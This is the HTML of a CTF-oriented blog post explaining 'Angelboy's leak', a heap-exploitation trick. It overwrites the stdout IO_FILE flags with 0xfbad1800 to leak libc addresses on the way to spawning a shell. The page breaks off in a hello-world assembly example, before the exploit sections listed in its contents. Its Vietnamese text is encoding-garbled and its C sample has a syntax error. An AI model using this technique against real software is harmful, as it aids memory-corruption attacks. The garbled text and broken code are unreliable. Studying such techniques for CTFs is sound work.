<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Technique: Angelboy&#39;s Leak: using IO_FILE to leak libc &middot; y198</title>
  <meta name="title" content="Technique: Angelboy&#39;s Leak: using IO_FILE to leak libc &middot; y198" />
  
  <meta name="description" content="A technique for you to leak libc without output function" />
  <meta name="keywords" content="Technique, " />
  
  
  <link rel="canonical" href="http://localhost:1313/posts/technique_angelboy_leak/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.0097581658ae3fa03ade917c3fd7f9cb7481cb85e5d0d460d052e00ae4281c242405c135163349d0b00a3852936d26243505c9c51f032746ec634544de345403.css"
    integrity="sha512-AJdYFliuP6A63pF8P9f5y3SBy4Xl0NRg0FLgCuQoHCQkBcE1FjNJ0LAKOFKTbSYkNQXJxR8DJ0bsY0VE3jRUAw==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.b36dda9ec4ec11e967fd341e7d57b8c484ac7a39f8f329f7bcf7ce4812569de8607db866a086d4789956ac0b74967e251c9a566d94d469dd28b8787fed4f46f5.js"
    integrity="sha512-s23ansTsEeln/TQefVe4xISsejn48yn3vPfOSBJWnehgfbhmoIbUeJlWrAt0ln4lHJpWbZTUad0ouHh/7U9G9Q==" data-copy="" data-copied=""></script>
  
  
  <script src="/js/zoom.min.js"></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="Technique: Angelboy&#39;s Leak: using IO_FILE to leak libc" />
<meta property="og:description" content="A technique for you to leak libc without output function" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/technique_angelboy_leak/" /><meta property="og:image" content="http://localhost:1313/posts/technique_angelboy_leak/feature.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-09-16T00:00:00+00:00" />

  <meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/posts/technique_angelboy_leak/feature.png" /><meta name="twitter:title" content="Technique: Angelboy&#39;s Leak: using IO_FILE to leak libc"/>
<meta name="twitter:description" content="A technique for you to leak libc without output function"/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Technique: Angelboy\u0027s Leak: using IO_FILE to leak libc",
    "headline": "Technique: Angelboy\u0027s Leak: using IO_FILE to leak libc",
    
    "abstract": "A technique for you to leak libc without output function",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/technique_angelboy_leak\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2022",
    "dateCreated": "2022-09-16T00:00:00\u002b00:00",
    "datePublished": "2022-09-16T00:00:00\u002b00:00",
    
    "dateModified": "2022-09-16T00:00:00\u002b00:00",
    
    "keywords": ["Technique"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2747"
  }]
  </script>


  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>





















  
  

  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    
    
    <div>
        <a href="/" class="flex">
            <span class="sr-only">y198</span>

            <img src="/img/blowfish_logo_transparent.png" width="223" height="223"
                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="y198" />

        </a>
    </div>
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">y198</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Blog
    </p>
</a>


            
            
  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Tags
    </p>
</a>


            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" for="menu-controller" class="block">
            <input type="checkbox" id="menu-controller" class="hidden" />
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li>
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Blog
        </p>
    </a>
</li>



                    

                    
  <li class="mt-1">
    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Tags
        </p>
    </a>
</li>



                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>




<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>


  </div>
</div>
<script>
  window.addEventListener('scroll', function (e) {
    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
    var background_blur = document.getElementById('menu-blur');
    background_blur.style.opacity = (scroll / 300);
  });
</script>

  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/posts/technique_angelboy_leak/feature_hu7ba8d3f7a2ff6a928b202d7ac44eb553_3214451_1200x0_resize_box_3.png);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      Technique: Angelboy's Leak: using IO_FILE to leak libc
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  





  



  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2022-09-16 00:00:00 &#43;0000 UTC">16 September 2022</time><span class="px-2 text-primary-500">&middot;</span><span>2747 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">13 mins</span>
  

  
  
</div>







    </div>

    
    
    
    
    

    
      
      
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>
    

    

    

    
    <div class="mb-5"></div>
    
  
  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">

         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#memo-t·∫£n-m·∫°n-m·ªôt-x√≠u-v·ªÅ-technique-tr√™n">üìù T·∫£n m·∫°n m·ªôt x√≠u v·ªÅ technique tr√™n?</a>
      <ul>
        <li><a href="#libc-l√†-g√¨-rocket">Libc l√† g√¨ üöÄ</a></li>
      </ul>
    </li>
    <li><a href="#how-this-technique-works-face_with_monocle">How this technique works? üßê</a>
      <ul>
        <li><a href="#ƒë·∫ßu-ti√™n-ta-ph·∫£i-hi·ªÉu-h√†m-puts-ho·∫°t-ƒë·ªông-ra-sao-face_with_raised_eyebrow">ƒê·∫ßu ti√™n ta ph·∫£i hi·ªÉu h√†m puts ho·∫°t ƒë·ªông ra sao ü§®</a></li>
        <li><a href="#inconclusion">Inconclusion</a></li>
      </ul>
    </li>
    <li><a href="#weapon">Weapon</a>
      <ul>
        <li><a href="#analyze">Analyze</a></li>
        <li><a href="#h∆∞·ªõng-exploit">H∆∞·ªõng exploit</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#memo-t·∫£n-m·∫°n-m·ªôt-x√≠u-v·ªÅ-technique-tr√™n">üìù T·∫£n m·∫°n m·ªôt x√≠u v·ªÅ technique tr√™n?</a>
      <ul>
        <li><a href="#libc-l√†-g√¨-rocket">Libc l√† g√¨ üöÄ</a></li>
      </ul>
    </li>
    <li><a href="#how-this-technique-works-face_with_monocle">How this technique works? üßê</a>
      <ul>
        <li><a href="#ƒë·∫ßu-ti√™n-ta-ph·∫£i-hi·ªÉu-h√†m-puts-ho·∫°t-ƒë·ªông-ra-sao-face_with_raised_eyebrow">ƒê·∫ßu ti√™n ta ph·∫£i hi·ªÉu h√†m puts ho·∫°t ƒë·ªông ra sao ü§®</a></li>
        <li><a href="#inconclusion">Inconclusion</a></li>
      </ul>
    </li>
    <li><a href="#weapon">Weapon</a>
      <ul>
        <li><a href="#analyze">Analyze</a></li>
        <li><a href="#h∆∞·ªõng-exploit">H∆∞·ªõng exploit</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>

 
<script>
  (function () {
    var $toc = $('#TableOfContents');
    if ($toc.length > 0) {
      var $window = $(window);

      function onScroll() {
        var currentScroll = $window.scrollTop();
        var h = $('.anchor');
        var id = "";
        h.each(function (i, e) {
          e = $(e);
          if (e.offset().top - $(window).height()/3 <= currentScroll) {
            id = e.attr('id');
          }
        });
        var active = $toc.find('a.active');      
        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;

        active.each(function (i, e) {
           
            $(e).removeClass('active').siblings('ul').hide();
          
        });
        $toc.find('a[href="#' + id + '"]').addClass('active')
        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
          $(e).children('a').parents('ul').show();          
        });
      }

      $window.on('scroll', onScroll);
      $(document).ready(function () {
         
          $toc.find('a').parent('li').find('ul').hide();
        
        onScroll();
      });
    }
  })();
</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          

<h2 class="relative group">üìù T·∫£n m·∫°n m·ªôt x√≠u v·ªÅ technique tr√™n? 
    <div id="memo-t%E1%BA%A3n-m%E1%BA%A1n-m%E1%BB%99t-x%C3%ADu-v%E1%BB%81-technique-tr%C3%AAn" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#memo-t%E1%BA%A3n-m%E1%BA%A1n-m%E1%BB%99t-x%C3%ADu-v%E1%BB%81-technique-tr%C3%AAn" aria-label="Anchor">#</a>
    </span>        
    
</h2>


<h3 class="relative group">Libc l√† g√¨ üöÄ 
    <div id="libc-l%C3%A0-g%C3%AC-rocket" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#libc-l%C3%A0-g%C3%AC-rocket" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><em><code>(n·∫øu nh∆∞ c√°c b·∫°n ƒë√£ bi·∫øt libc l√† g√¨ v√† bi·∫øt technique ret2libc th√¨ c√≥ th·ªÉ b·ªè qua ph·∫ßn n√†y) </code></em>
<strong>ƒê·ªëi v·ªõi m·ªôt s·ªë b·∫°n ch∆°i Pwnable n√≥i ri√™ng v√† c√°c b·∫°n ch∆°i CTF n√≥i chung th√¨ ƒë√£ √≠t nhi·ªÅu nghe ƒë·∫øn c·ª•m t·ª´ &ldquo;Libc&rdquo;. V·∫≠y libc l√† g√¨?</strong>
<em><code>&quot;C·ª•m t·ª´ &quot;libc&quot; th∆∞·ªùng ƒë∆∞·ª£c d√πng nh∆∞ l√† m·ªôt t·ª´ vi·∫øt t·∫Øt cho &quot;standard C library&quot;, m·ªôt th∆∞ vi·ªán c√°c h√†m c√°i m√† c√≥ th·ªÉ d√πng b·ªüi t·∫•t c·∫£ C programs&quot;</code></em></p>
<p>V·∫≠y c√≥ nghƒ©a, ƒë·ªãa ch·ªâ g·ªëc c·ªßa libc r·∫•t l√† quan tr·ªçng, khi b·∫°n ƒë√£ c√≥ ƒë·ªãa ch·ªâ g·ªëc c·ªßa libc b·∫°n c√≥ th·ªÉ l√†m r·∫•t l√† nhi·ªÅu th·ª©, ƒëi·ªÉn h√¨nh nh·∫•t l√†  b·∫°n c√≥ th·ªÉ d√πng one_gadget ƒë·ªÉ execve(&rsquo;/bin/sh&rsquo;,0,0) ho·∫∑c l√† g·ªçi system(&rsquo;/bin/sh&rsquo;),&hellip;.. N√¥m na cu·ªëi c√πng libc d√πng ƒë·ªÉ pop a shell.
ƒê·ªÉ c√≥ th·ªÉ ƒë·ªëi ph√≥ v·ªõi v·∫•n ƒë·ªÅ tr√™n, m·ªôt s·ªë  challenge&rsquo;s author s·∫Ω kh√¥ng cho b·∫•t c·ª© function(puts, printf,&hellip;.) ƒë·ªÉ c√≥ th·ªÉ leak ra ƒë·ªãa ch·ªâ c·ªßa libc.





  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/rGakA4H.png" alt="" />
    
  </figure>

</p>


<h2 class="relative group">How this technique works? üßê 
    <div id="how-this-technique-works-face_with_monocle" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#how-this-technique-works-face_with_monocle" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>M√¨nh kh√¥ng ch·∫Øc ai l√† ng∆∞·ªùi t·∫°o ra technique n√†y nh∆∞ng m√† l·∫ßn ƒë·∫ßu ti√™n m√¨nh th·∫•y n√≥ ƒë∆∞·ª£c √°p d·ª•ng v√†o trong ctf l√† v√†o gi·∫£i HITCON 2018 c√¢u babytcache c·ªßa angelboy.tw, sau ƒë√≥ anh ·∫•y c√≥ publish solution cho c√¢u n√†y t·∫°i ƒë√¢y: github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py</p>
<p>V·∫≠y n√™n technique n√†y yang h·ªì hay g·ªçi l√†: <strong>Angelboy&rsquo;s leak</strong>
Technique n√†y s·∫Ω gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ thay ƒë·ªïi c·∫•u tr√∫c stdout c·ªßa IO_FILE ƒë·ªÉ c√≥ th·ªÉ bi·∫øn n√≥ th√†nh h√†m puts ƒë·ªÉ leak ƒë·ªãa ch·ªâ c·ªßa libc. N√≥ thay ƒë·ªïi c·∫•u tr√∫c c·ªßa stdout c·ªßa IO_FILE b·∫±ng c√°ch modify flag bit c·ªßa stdout th√†nh <code>0xfbad1800</code> v√† khi·∫øn cho byte cu·ªëi c·ªßa <code>_IO_write_base</code> nh·ªè l·∫°i. ·ªû b√™n d∆∞·ªõi m√¨nh s·∫Ω n√≥i t·∫°i sao modify flag bit c·ªßa stdout th√†nh 0xfbad1800.</p>


<h3 class="relative group">ƒê·∫ßu ti√™n ta ph·∫£i hi·ªÉu h√†m puts ho·∫°t ƒë·ªông ra sao ü§® 
    <div id="%C4%91%E1%BA%A7u-ti%C3%AAn-ta-ph%E1%BA%A3i-hi%E1%BB%83u-h%C3%A0m-puts-ho%E1%BA%A1t-%C4%91%E1%BB%99ng-ra-sao-face_with_raised_eyebrow" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#%C4%91%E1%BA%A7u-ti%C3%AAn-ta-ph%E1%BA%A3i-hi%E1%BB%83u-h%C3%A0m-puts-ho%E1%BA%A1t-%C4%91%E1%BB%99ng-ra-sao-face_with_raised_eyebrow" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>M·ªôt c√°i v√≠ d·ª• c∆° b·∫£n v·ªÅ h√†m puts g·ªçi trong libc, th√¨ m√¨nh s·∫Ω d√πng m·ªôt ch∆∞∆°ng tr√¨nh in ra &ldquo;Hello world&rdquo;, m·ªôt ch∆∞∆°ng tr√¨nh t·ª´ thu·ªü s∆° khai ai c≈©ng ph·∫£i ti·∫øp x√∫c trong c√°i b·ªô m√¥n n√†y.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello World</span><span class="se">\n</span><span class="s">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>·ªû c√°c version sau n√†y c·ªßa libc th√¨ khi compile ·ªü assembly code th√¨ n√≥ s·∫Ω g·ªçi tr·ª±c ti·∫øp ƒë·∫øn h√†m printf lu√¥n nh∆∞ng m√† ·ªü c√°c libc c≈© th√¨ n√≥ s·∫Ω g·ªçi ƒë·∫øn h√†m puts  nh∆∞ng m√† ƒëi·ªÅu ƒë√≥ v·∫´n kh√¥ng quan tr·ªçng cho l·∫Øm</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">  <span class="na">.file</span> <span class="s">&#34;hello.c&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="na">.section</span>  <span class="no">.rodata</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">  <span class="na">.string</span> <span class="s">&#34;Hello World!&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="na">.text</span>
</span></span><span class="line"><span class="cl">  <span class="na">.globl</span>  <span class="no">main</span>
</span></span><span class="line"><span class="cl">  <span class="na">.type</span> <span class="no">main</span><span class="p">,</span> <span class="na">@function</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pushq</span> <span class="nv">%rbp</span>
</span></span><span class="line"><span class="cl">  <span class="nf">movq</span>  <span class="nv">%rsp</span><span class="p">,</span> <span class="nv">%rbp</span>
</span></span><span class="line"><span class="cl">  <span class="nf">movl</span>  <span class="no">$.LC0</span><span class="p">,</span> <span class="nv">%edi</span>
